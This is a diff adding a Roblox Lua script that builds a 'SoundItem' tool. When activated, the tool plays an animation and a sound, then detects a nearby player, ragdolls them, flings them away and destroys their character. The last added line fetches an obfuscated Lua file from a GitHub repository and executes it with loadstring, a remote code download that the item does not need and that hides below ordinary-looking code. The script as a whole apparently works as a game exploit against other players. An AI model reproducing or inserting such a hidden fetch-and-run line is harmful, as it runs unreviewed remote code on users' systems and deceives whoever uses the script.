@@ -1,0 +1,84 @@
+-- Criando a Tool (item)
+local tool = Instance.new("Tool")
+tool.Name = "SoundItem"
+tool.RequiresHandle = true
+
+-- Criando o Handle (parte física da ferramenta)
+local handle = Instance.new("Part")
+handle.Name = "Handle"
+handle.Size = Vector3.new(1, 5, 1)  -- Tamanho do item
+handle.Anchored = false
+handle.CanCollide = false
+handle.Parent = tool
+
+-- Adicionando a Tool ao jogador
+tool.Parent = game.Players.LocalPlayer.Backpack
+
+-- Adicionando o som ao item
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://6729922069"  -- ID do som
+sound.Parent = handle
+
+-- Função para tocar o som e animação com delay no som
+tool.Activated:Connect(function()
+    -- Criando a animação para o jogador
+    local anim = Instance.new("Animation")
+    anim.AnimationId = "rbxassetid://218504594"  -- ID da animação
+    local humanoid = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
+    
+    -- Reproduz a animação no humanoide do jogador
+    humanoid:LoadAnimation(anim):Play()
+
+    -- Esperar 0.3 segundos antes de tocar o som
+    wait(0.3)
+    
+    -- Reproduz o som
+    sound:Play()
+
+    -- Verifica se a animação atingiu algum jogador
+    local character = game.Players.LocalPlayer.Character
+    if character then
+        -- Detecta se a animação atingiu outro jogador
+        local hit = workspace:FindPartOnRayWithIgnoreList(character.HumanoidRootPart.Position, character.HumanoidRootPart.CFrame.LookVector * 5, {character})
+        
+        -- Se colidiu com algo que tem um humanoide (outro jogador)
+        if hit and hit.Parent and hit.Parent:FindFirstChild("Humanoid") then
+            local targetHumanoid = hit.Parent:FindFirstChild("Humanoid")
+            
+            -- Tornar o alvo ragdoll
+            if targetHumanoid then
+                local targetCharacter = hit.Parent
+
+                -- Desativa a movimentação do humanoide
+                targetHumanoid.PlatformStand = true
+                targetHumanoid:ChangeState(Enum.HumanoidStateType.Physics)
+
+                -- Destruir o Humanoid e aplicar física
+                for _, part in pairs(targetCharacter:GetChildren()) do
+                    if part:IsA("Part") then
+                        part.Anchored = false
+                        part.CanCollide = true
+
+                        -- Adicionar força para "arremessar" o jogador para longe
+                        local bodyVelocity = Instance.new("BodyVelocity")
+                        bodyVelocity.MaxForce = Vector3.new(10000, 10000, 10000)  -- Força máxima
+                        bodyVelocity.Velocity = (targetCharacter.HumanoidRootPart.Position - character.HumanoidRootPart.Position).unit * 100  -- Direção e força do impulso
+                        bodyVelocity.Parent = part
+
+                        -- Garantir que a personagem caia no chão aplicando uma força para baixo
+                        local bodyForce = Instance.new("BodyVelocity")
+                        bodyForce.MaxForce = Vector3.new(0, 10000, 0)
+                        bodyForce.Velocity = Vector3.new(0, -50, 0)  -- Empurrar para baixo
+                        bodyForce.Parent = part
+                    end
+                end
+
+                -- Remover a física após um curto período
+                game:GetService("Debris"):AddItem(targetCharacter, 0.1)
+            end
+        end
+    end
+end)
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
+
